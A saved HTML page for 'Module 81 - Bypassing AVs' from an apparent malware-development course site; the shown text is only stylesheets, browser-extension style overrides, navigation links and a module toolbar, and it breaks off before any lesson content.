f242"}.fa-battery-1:before,.fa-battery-quarter:before{content:"\f243"}.fa-battery-0:before,.fa-battery-empty:before{content:"\f244"}.fa-mouse-pointer:before{content:"\f245"}.fa-i-cursor:before{content:"\f246"}.fa-object-group:before{content:"\f247"}.fa-object-ungroup:before{content:"\f248"}.fa-sticky-note:before{content:"\f249"}.fa-sticky-note-o:before{content:"\f24a"}.fa-cc-jcb:before{content:"\f24b"}.fa-cc-diners-club:before{content:"\f24c"}.fa-clone:before{content:"\f24d"}.fa-balance-scale:before{content:"\f24e"}.fa-hourglass-o:before{content:"\f250"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:"\f251"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:"\f252"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:"\f253"}.fa-hourglass:before{content:"\f254"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:"\f255"}.fa-hand-stop-o:before,.fa-hand-paper-o:before{content:"\f256"}.fa-hand-scissors-o:before{content:"\f257"}.fa-hand-lizard-o:before{content:"\f258"}.fa-hand-spock-o:before{content:"\f259"}.fa-hand-pointer-o:before{content:"\f25a"}.fa-hand-peace-o:before{content:"\f25b"}.fa-trademark:before{content:"\f25c"}.fa-registered:before{content:"\f25d"}.fa-creative-commons:before{content:"\f25e"}.fa-gg:before{content:"\f260"}.fa-gg-circle:before{content:"\f261"}.fa-tripadvisor:before{content:"\f262"}.fa-odnoklassniki:before{content:"\f263"}.fa-odnoklassniki-square:before{content:"\f264"}.fa-get-pocket:before{content:"\f265"}.fa-wikipedia-w:before{content:"\f266"}.fa-safari:before{content:"\f267"}.fa-chrome:before{content:"\f268"}.fa-firefox:before{content:"\f269"}.fa-opera:before{content:"\f26a"}.fa-internet-explorer:before{content:"\f26b"}.fa-tv:before,.fa-television:before{content:"\f26c"}.fa-contao:before{content:"\f26d"}.fa-500px:before{content:"\f26e"}.fa-amazon:before{content:"\f270"}.fa-calendar-plus-o:before{content:"\f271"}.fa-calendar-minus-o:before{content:"\f272"}.fa-calendar-times-o:before{content:"\f273"}.fa-calendar-check-o:before{content:"\f274"}.fa-industry:before{content:"\f275"}.fa-map-pin:before{content:"\f276"}.fa-map-signs:before{content:"\f277"}.fa-map-o:before{content:"\f278"}.fa-map:before{content:"\f279"}.fa-commenting:before{content:"\f27a"}.fa-commenting-o:before{content:"\f27b"}.fa-houzz:before{content:"\f27c"}.fa-vimeo:before{content:"\f27d"}.fa-black-tie:before{content:"\f27e"}.fa-fonticons:before{content:"\f280"}.fa-reddit-alien:before{content:"\f281"}.fa-edge:before{content:"\f282"}.fa-credit-card-alt:before{content:"\f283"}.fa-codiepie:before{content:"\f284"}.fa-modx:before{content:"\f285"}.fa-fort-awesome:before{content:"\f286"}.fa-usb:before{content:"\f287"}.fa-product-hunt:before{content:"\f288"}.fa-mixcloud:before{content:"\f289"}.fa-scribd:before{content:"\f28a"}.fa-pause-circle:before{content:"\f28b"}.fa-pause-circle-o:before{content:"\f28c"}.fa-stop-circle:before{content:"\f28d"}.fa-stop-circle-o:before{content:"\f28e"}.fa-shopping-bag:before{content:"\f290"}.fa-shopping-basket:before{content:"\f291"}.fa-hashtag:before{content:"\f292"}.fa-bluetooth:before{content:"\f293"}.fa-bluetooth-b:before{content:"\f294"}.fa-percent:before{content:"\f295"}.fa-gitlab:before{content:"\f296"}.fa-wpbeginner:before{content:"\f297"}.fa-wpforms:before{content:"\f298"}.fa-envira:before{content:"\f299"}.fa-universal-access:before{content:"\f29a"}.fa-wheelchair-alt:before{content:"\f29b"}.fa-question-circle-o:before{content:"\f29c"}.fa-blind:before{content:"\f29d"}.fa-audio-description:before{content:"\f29e"}.fa-volume-control-phone:before{content:"\f2a0"}.fa-braille:before{content:"\f2a1"}.fa-assistive-listening-systems:before{content:"\f2a2"}.fa-asl-interpreting:before,.fa-american-sign-language-interpreting:before{content:"\f2a3"}.fa-deafness:before,.fa-hard-of-hearing:before,.fa-deaf:before{content:"\f2a4"}.fa-glide:before{content:"\f2a5"}.fa-glide-g:before{content:"\f2a6"}.fa-signing:before,.fa-sign-language:before{content:"\f2a7"}.fa-low-vision:before{content:"\f2a8"}.fa-viadeo:before{content:"\f2a9"}.fa-viadeo-square:before{content:"\f2aa"}.fa-snapchat:before{content:"\f2ab"}.fa-snapchat-ghost:before{content:"\f2ac"}.fa-snapchat-square:before{content:"\f2ad"}.fa-pied-piper:before{content:"\f2ae"}.fa-first-order:before{content:"\f2b0"}.fa-yoast:before{content:"\f2b1"}.fa-themeisle:before{content:"\f2b2"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:"\f2b3"}.fa-fa:before,.fa-font-awesome:before{content:"\f2b4"}.fa-handshake-o:before{content:"\f2b5"}.fa-envelope-open:before{content:"\f2b6"}.fa-envelope-open-o:before{content:"\f2b7"}.fa-linode:before{content:"\f2b8"}.fa-address-book:before{content:"\f2b9"}.fa-address-book-o:before{content:"\f2ba"}.fa-vcard:before,.fa-address-card:before{content:"\f2bb"}.fa-vcard-o:before,.fa-address-card-o:before{content:"\f2bc"}.fa-user-circle:before{content:"\f2bd"}.fa-user-circle-o:before{content:"\f2be"}.fa-user-o:before{content:"\f2c0"}.fa-id-badge:before{content:"\f2c1"}.fa-drivers-license:before,.fa-id-card:before{content:"\f2c2"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:"\f2c3"}.fa-quora:before{content:"\f2c4"}.fa-free-code-camp:before{content:"\f2c5"}.fa-telegram:before{content:"\f2c6"}.fa-thermometer-4:before,.fa-thermometer:before,.fa-thermometer-full:before{content:"\f2c7"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:"\f2c8"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:"\f2c9"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:"\f2ca"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:"\f2cb"}.fa-shower:before{content:"\f2cc"}.fa-bathtub:before,.fa-s15:before,.fa-bath:before{content:"\f2cd"}.fa-podcast:before{content:"\f2ce"}.fa-window-maximize:before{content:"\f2d0"}.fa-window-minimize:before{content:"\f2d1"}.fa-window-restore:before{content:"\f2d2"}.fa-times-rectangle:before,.fa-window-close:before{content:"\f2d3"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:"\f2d4"}.fa-bandcamp:before{content:"\f2d5"}.fa-grav:before{content:"\f2d6"}.fa-etsy:before{content:"\f2d7"}.fa-imdb:before{content:"\f2d8"}.fa-ravelry:before{content:"\f2d9"}.fa-eercast:before{content:"\f2da"}.fa-microchip:before{content:"\f2db"}.fa-snowflake-o:before{content:"\f2dc"}.fa-superpowers:before{content:"\f2dd"}.fa-wpexplorer:before{content:"\f2de"}.fa-meetup:before{content:"\f2e0"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}</style><style class="darkreader darkreader--sync" media="screen"></style>
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="81_files/css2.css" rel="stylesheet">
        <link href="81_files/css2_002.css" rel="stylesheet">
        <title>Bypassing AVs</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="81_files/app-CuOUn2oZ.css"><link rel="stylesheet" href="81_files/app-CuOUn2oZ.css"><style class="darkreader darkreader--sync" media="screen"></style><link href="81_files/prism-coldark-dark.css" rel="stylesheet"><style class="darkreader darkreader--sync" media="screen"></style>

<link rel="stylesheet" href="81_files/viewer.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <meta name="darkreader" content="bb64739aa7ca4fcca13992ce190f7aed"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
    color: var(--darkreader-text-302505, #d7d4cf) !important;
}
#vimvixen-console-frame {
    color-scheme: light !important;
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
}
.tou-uknfeu {
    background-color: var(--darkreader-background-faedda, #432c09) !important;
}
.tou-6i3zyv {
    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
}
div.mermaid-viewer-control-panel .btn {
    background-color: var(--darkreader-neutral-background);
    fill: var(--darkreader-neutral-text);
}
svg g rect.er {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
    fill: var(--darkreader-selection-background);
    fill-opacity: 0.8 !important;
}
svg rect.er.relationshipLabelBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect,
svg g g.nodes polygon {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
    fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0,
svg line.messageLine1 {
    stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
    fill: var(--darkreader-neutral-background) !important;
}
mitid-authenticators-code-app > .code-app-container {
    background-color: white !important;
    padding-top: 1rem;
}
iframe#unpaywall[src$="unpaywall.html"] {
    color-scheme: light !important;
}
select {
    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
}
select * {
    background-color: var(--darkreader-neutral-background) !important;
}
body#tumblr {
    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
    --darkreader-bg--white: 23, 23, 23 !important;
    --darkreader-text--black: 228, 224, 218 !important;
}
:host {
    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
:host([_floating]) .d2l-floating-buttons-container {
    background-color: var(--darkreader-neutral-background) !important;
    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
    opacity: 0.88 !important;
}
d2l-card {
    background: var(--darkreader-neutral-background) !important;
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
d2l-dropdown-content > div,
d2l-menu-item {
    background-color: var(--darkreader-neutral-background) !important;
    border-radius: 10px !important;
}
d2l-empty-state-simple {
    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-button-filter > ul > li > a.vui-button {
    border-color: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-label-text:has(.d2l-button-subtle-content):hover,
.d2l-label-text:has(.d2l-button-subtle-content):focus,
.d2l-label-text:has(.d2l-button-subtle-content):active {
    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-navigation-centerer {
    color: inherit !important;
}
.d2l-tabs-layout {
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
.d2l-input,
.d2l-calendar-date,
.d2l-htmleditor-container {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-collapsible-panel {
    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
    border-radius: 0.4rem !important;
}
.d2l-collapsible-panel-divider {
    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-w2d-flex {
    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-collapsible-panel scrolled,
.d2l-collapsible-panel-header,
.d2l-w2d-collection-fixed {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-loading-spinner-bg {
    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-loading-spinner-bg-stroke {
    stroke: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-loading-spinner-wrapper svg path,
.d2l-loading-spinner-wrapper svg circle {
    fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style><style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="w-full px-2 sm:px-0 z-40
    bg-[#101926] backdrop-blur-md sticky backdrop-saturate-150 border-b border-gray-700/50
     hidden">

    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[100px] h-[60px]" src="81_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto items-center" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 rounded-lg border md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 dark:border-gray-900">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Maldev Database</a>
          </li>
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4" style="--darkreader-inline-stroke: currentColor;" data-darkreader-inline-stroke=""></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700 z-20">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                                        <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-600/90 hover:bg-blue-500/80 border border-blue-400/40 shadow-md font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 transition-all duration-200 backdrop-blur-sm backdrop-saturate-150">
              Dashboard
            </a>
          </li>
                  </ul>
      </div>
    </div>
      </nav>        <template id="app-template">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="81_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 81 - Bypassing AVs
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-amber-400/90 ring-1 ring-amber-300/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="81_files#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="81_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="81_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="81_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="81_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container relative inline-block text-left flex">
                <button id="dl-btn" class="focus:outline-none items-center" aria-haspopup="true" aria-expanded="false">
                    <img src="81_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </button>

